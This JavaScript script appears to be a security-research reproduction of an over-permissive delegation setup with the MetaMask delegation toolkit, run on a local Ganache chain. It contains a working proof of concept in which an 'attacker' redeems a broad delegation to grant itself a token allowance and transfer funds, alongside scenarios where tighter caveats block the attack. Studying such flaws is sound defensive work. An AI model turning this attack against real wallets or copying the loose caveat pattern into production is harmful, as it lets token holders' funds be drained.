import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const experimentRoot = path.resolve(__dirname, "..");
const dependencyRoot =
  process.env.C01_DEPENDENCY_ROOT ??
  path.join(experimentRoot, "evidence", "c01-dependencies");
const dependencyRequire = createRequire(
  path.join(dependencyRoot, "package.json"),
);
const toolkit = dependencyRequire("@metamask/delegation-toolkit");
const viem = dependencyRequire("viem");
const { sepolia } = dependencyRequire("viem/chains");
const { mnemonicToAccount } = dependencyRequire("viem/accounts");
const runtimeRoot = process.env.I08_RUNTIME_ROOT ?? path.resolve(experimentRoot, "../direct-manager/tools/runtime");
const runtimeRequire = createRequire(path.join(runtimeRoot, "package.json"));
const ganache = runtimeRequire("ganache");
const solc = runtimeRequire("solc");

const chainId = sepolia.id;
const tokenAddress = "0xa2bDc7A104d0554Ca70A28f74177501E377b1Cd8";
const zeroAddress = "0x0000000000000000000000000000000000000000";
const mnemonic =
  "test test test test test test test test test test test junk";
const admin = mnemonicToAccount(mnemonic, { addressIndex: 0 });
const operatorOwner = mnemonicToAccount(mnemonic, { addressIndex: 1 });
const attacker = mnemonicToAccount(mnemonic, { addressIndex: 2 });
const knownSpender = mnemonicToAccount(mnemonic, { addressIndex: 3 });
const runDir = fs.mkdtempSync(path.join(os.tmpdir(), "c01-manager-"));
const outputPath = path.join(
  experimentRoot,
  "reruns",
  "c01-manager-experiment.json",
);

const tokenSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract C01Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor() { balanceOf[msg.sender] = 1_000_000_000 ether; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        require(balanceOf[from] >= amount, "balance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function setAllowance(address owner, address spender, uint256 amount) external {
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setBalance(address owner, uint256 amount) external { balanceOf[owner] = amount; }
}`;

function compileToken() {
  const input = {
    language: "Solidity",
    sources: { "C01Token.sol": { content: tokenSource } },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      outputSelection: { "*": { "*": ["abi", "evm.bytecode.object"] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors ?? []).filter((entry) => entry.severity === "error");
  if (errors.length) throw new Error(errors.map((entry) => entry.formattedMessage).join("\n"));
  return output.contracts["C01Token.sol"].C01Token;
}

const tokenArtifact = compileToken();
const tokenAbi = tokenArtifact.abi;
const approveAbi = viem.parseAbi([
  "function approve(address spender, uint256 amount) returns (bool)",
]);
const abis = {
  mint: tokenAbi.find((item) => item.type === "function" && item.name === "mint"),
  transfer: tokenAbi.find((item) => item.type === "function" && item.name === "transfer"),
  approve: tokenAbi.find((item) => item.type === "function" && item.name === "approve"),
  transferFrom: tokenAbi.find(
    (item) => item.type === "function" && item.name === "transferFrom",
  ),
  permit: {
    name: "permit",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
      { name: "deadline", type: "uint256" },
      { name: "v", type: "uint8" },
      { name: "r", type: "bytes32" },
      { name: "s", type: "bytes32" },
    ],
    outputs: [],
  },
};

const provider = ganache.provider({
  chain: { chainId, networkId: chainId, hardfork: "shanghai" },
  wallet: { mnemonic, totalAccounts: 12, defaultBalance: 1000 },
  miner: { blockGasLimit: 30_000_000, callGasLimit: 50_000_000 },
  database: { dbPath: path.join(runDir, "chain") },
  logging: { quiet: true },
});
const publicClient = viem.createPublicClient({
  chain: sepolia,
  transport: viem.custom(provider),
});
const walletClient = viem.createWalletClient({
  chain: sepolia,
  transport: viem.custom(provider),
  account: admin,
});

async function wait(hash) {
  return publicClient.waitForTransactionReceipt({ hash });
}

function sourceCaveats(environment, extra = []) {
  return toolkit
    .createCaveatBuilder(environment, { allowEmptyCaveats: false })
    .addCaveat("allowedMethods", [
      "0x00000001",
      abis.mint,
      abis.transfer,
      abis.approve,
      abis.transferFrom,
      abis.permit,
    ])
    .addCaveat("allowedTargets", [zeroAddress, tokenAddress])
    .addCaveat("limitedCalls", 5)
    .build()
    .concat(extra);
}

function approveOnlyCaveats(environment, spender, amount) {
  return toolkit
    .createCaveatBuilder(environment, { allowEmptyCaveats: false })
    .addCaveat("allowedMethods", [abis.approve])
    .addCaveat("allowedTargets", [tokenAddress])
    .addCaveat(
      "allowedCalldata",
      4,
      viem.encodeAbiParameters([{ type: "address" }], [spender.address]),
    )
    .addCaveat(
      "allowedCalldata",
      36,
      viem.encodeAbiParameters([{ type: "uint256" }], [amount]),
    )
    .addCaveat("limitedCalls", 1)
    .build();
}

async function signChain(environment, extraCaveats, salt, mode = "source") {
  const delegation = toolkit.createDelegation({
    from: operatorAccount.address,
    to: attacker.address,
    caveats:
      mode === "approveOnly"
        ? approveOnlyCaveats(environment, knownSpender, 10n * 10n ** 18n)
        : sourceCaveats(environment, extraCaveats),
    salt,
  });
  const signature = await operatorAccount.signDelegation({ delegation });
  return { ...delegation, signature };
}

let operatorAccount;
let environment;
const results = [];
const substitutions = [
  "The root uses the official 1.3.0 Hybrid account and the old manager/enforcer deployment.",
  "The terminal delegate is a local EOA so the browser and bundler are not needed.",
  "The TEST-token address and ABI are preserved, but runtime code and storage are a local fixture.",
];

try {
  environment = await toolkit.deployDeleGatorEnvironment(
    walletClient,
    publicClient,
    sepolia,
  );
  toolkit.overrideDeployedEnvironment(chainId, "1.3.0", environment);
  operatorAccount = await toolkit.toMetaMaskSmartAccount({
    client: publicClient,
    implementation: toolkit.Implementation.Hybrid,
    deployParams: [operatorOwner.address, [], [], []],
    deploySalt: "0x01",
    signatory: { account: operatorOwner },
  });
  if (!(await operatorAccount.isDeployed())) {
    const { factory, factoryData } = await operatorAccount.getFactoryArgs();
    await wait(
      await walletClient.sendTransaction({
        to: factory,
        data: factoryData,
      }),
    );
  }
  const deployment = await walletClient.deployContract({
    abi: tokenAbi,
    bytecode: `0x${tokenArtifact.evm.bytecode.object}`,
  });
  const tokenReceipt = await wait(deployment);
  const runtime = await publicClient.getCode({ address: tokenReceipt.contractAddress });
  await provider.request({
    method: "evm_setAccountCode",
    params: [tokenAddress, runtime],
  });
  await wait(
    await walletClient.writeContract({
      address: tokenAddress,
      abi: tokenAbi,
      functionName: "setBalance",
      args: [operatorAccount.address, 1_000_000n * 10n ** 18n],
    }),
  );

  const amountTen = 10n * 10n ** 18n;
  const amountLarge = 1000n * 10n ** 18n;
  const scenarios = [
    {
      name: "source_intended",
      spender: knownSpender,
      amount: amountTen,
      extra: [],
      expected: "success",
    },
    {
      name: "source_attacker_large",
      spender: attacker,
      amount: amountLarge,
      extra: [],
      expected: "success",
      transfer: true,
    },
    {
      name: "allowed_calldata_intended",
      spender: knownSpender,
      amount: amountTen,
      extra: [
        {
          type: "allowedCalldata",
          startIndex: 4,
          value: viem.encodeAbiParameters(
            [{ type: "address" }],
            [knownSpender.address],
          ),
        },
        {
          type: "allowedCalldata",
          startIndex: 36,
          value: viem.encodeAbiParameters([{ type: "uint256" }], [amountTen]),
        },
      ],
      expected: "success",
    },
    {
      name: "allowed_calldata_attacker_large",
      spender: attacker,
      amount: amountLarge,
      extra: [
        {
          type: "allowedCalldata",
          startIndex: 4,
          value: viem.encodeAbiParameters(
            [{ type: "address" }],
            [knownSpender.address],
          ),
        },
        {
          type: "allowedCalldata",
          startIndex: 36,
          value: viem.encodeAbiParameters([{ type: "uint256" }], [amountTen]),
        },
      ],
      expected: "reverted",
    },
    {
      name: "separated_general_transfer",
      spender: knownSpender,
      amount: amountTen,
      extra: [],
      mode: "source",
      functionName: "transfer",
      expected: "success",
    },
    {
      name: "separated_approve_only_intended",
      spender: knownSpender,
      amount: amountTen,
      extra: [],
      mode: "approveOnly",
      functionName: "approve",
      expected: "success",
    },
    {
      name: "separated_approve_only_attack",
      spender: attacker,
      amount: amountLarge,
      extra: [],
      mode: "approveOnly",
      functionName: "approve",
      expected: "reverted",
    },
  ];
  for (let index = 0; index < scenarios.length; index += 1) {
    const scenario = scenarios[index];
    for (const spender of [knownSpender, attacker]) {
      await wait(
        await walletClient.writeContract({
          address: tokenAddress,
          abi: tokenAbi,
          functionName: "setAllowance",
          args: [operatorAccount.address, spender.address, 0n],
        }),
      );
    }
    const builder = toolkit.createCaveatBuilder(environment, {
      allowEmptyCaveats: true,
    });
    for (const item of scenario.extra) {
      builder.addCaveat(item.type, item.startIndex, item.value);
    }
    const extra = scenario.extra.length ? builder.build() : [];
    const signed = await signChain(
      environment,
      extra,
      viem.toHex(index + 1, { size: 32 }),
      scenario.mode,
    );
    const callData = viem.encodeFunctionData({
      abi: tokenAbi,
      functionName: scenario.functionName ?? "approve",
      args: [scenario.spender.address, scenario.amount],
    });
    const execution = toolkit.createExecution(tokenAddress, 0n, callData);
    const redeemData = toolkit.DelegationFramework.encode.redeemDelegations({
      delegations: [[signed]],
      modes: [toolkit.SINGLE_DEFAULT_MODE],
      executions: [[execution]],
    });
    let hash = null;
    let receipt = null;
    let error = null;
    let ethCallError = null;
    try {
      await provider.request({
        method: "eth_call",
        params: [
          {
            from: attacker.address,
            to: environment.DelegationManager,
            data: redeemData,
            gas: viem.toHex(5_000_000),
          },
          "latest",
        ],
      });
    } catch (caught) {
      ethCallError = {
        message: caught.message,
        data: caught?.data ?? caught?.cause?.data ?? null,
      };
    }
    try {
      hash = await walletClient.sendTransaction({
        account: attacker,
        to: environment.DelegationManager,
        data: redeemData,
        gas: 5_000_000n,
      });
      receipt = await wait(hash);
    } catch (caught) {
      error = caught.message;
    }
    const allowance = await publicClient.readContract({
      address: tokenAddress,
      abi: tokenAbi,
      functionName: "allowance",
      args: [operatorAccount.address, scenario.spender.address],
    });
    let transfer = null;
    if (receipt?.status === "success" && scenario.transfer) {
      const transferHash = await walletClient.writeContract({
        account: attacker,
        address: tokenAddress,
        abi: tokenAbi,
        functionName: "transferFrom",
        args: [operatorAccount.address, attacker.address, 55n],
      });
      const transferReceipt = await wait(transferHash);
      transfer = {
        transactionHash: transferHash,
        status: transferReceipt.status,
        balance: (
          await publicClient.readContract({
            address: tokenAddress,
            abi: tokenAbi,
            functionName: "balanceOf",
            args: [attacker.address],
          })
        ).toString(),
      };
    }
    results.push({
      ...scenario,
      expected: scenario.expected,
      initialAllowance: "0",
      status: receipt?.status ?? "submission_error",
      transactionHash: hash,
      gasUsed: receipt?.gasUsed?.toString() ?? null,
      logCount: receipt?.logs?.length ?? null,
      allowance: allowance.toString(),
      transfer,
      error,
      ethCallError,
      caveatNames: signed.caveats.map((caveat) => {
        return (
          Object.entries(environment.caveatEnforcers).find(
            ([, address]) => address.toLowerCase() === caveat.enforcer.toLowerCase(),
          )?.[0] ?? "unknown"
        );
      }),
    });
  }
} catch (error) {
  results.push({ name: "experiment_failure", status: "error", error: error.stack });
} finally {
  await provider.disconnect?.();
  fs.rmSync(runDir, { recursive: true, force: true });
}

const mismatches = [];
for (const result of results) {
  if (result.name === "experiment_failure") {
    mismatches.push(`experiment failed: ${result.error}`);
    continue;
  }
  if (!result.expected) continue;
  if (result.status !== result.expected) {
    mismatches.push(`${result.name}: ${result.status} != ${result.expected}`);
  }
}
const report = {
  candidateId: "C01",
  generatedAt: new Date().toISOString(),
  source: {
    repository: "miguelmota/account-abstraction-demos",
    commit: "7f184476e50b09b2be61ba788d55fc045393ddac",
    file: "src/demo-7702-4337-delegation/useDemo.ts",
  },
  dependencyVersions: { delegationToolkit: "0.10.2", viem: "2.29.4" },
  substitutions,
  environment,
  operatorAccount: operatorAccount?.address ?? null,
  attacker: attacker.address,
  knownSpender: knownSpender.address,
  tokenAddress,
  results,
  assertions: { passed: mismatches.length === 0, mismatches },
};
fs.mkdirSync(path.dirname(outputPath), { recursive: true });
fs.writeFileSync(
  outputPath,
  `${JSON.stringify(report, (_key, value) => (typeof value === "bigint" ? value.toString() : value), 2)}\n`,
);
console.log(JSON.stringify({ outputPath, ...report.assertions, results: results.map((item) => ({ name: item.name, status: item.status, allowance: item.allowance, transfer: item.transfer })) }, null, 2));
if (!report.assertions.passed) process.exitCode = 1;
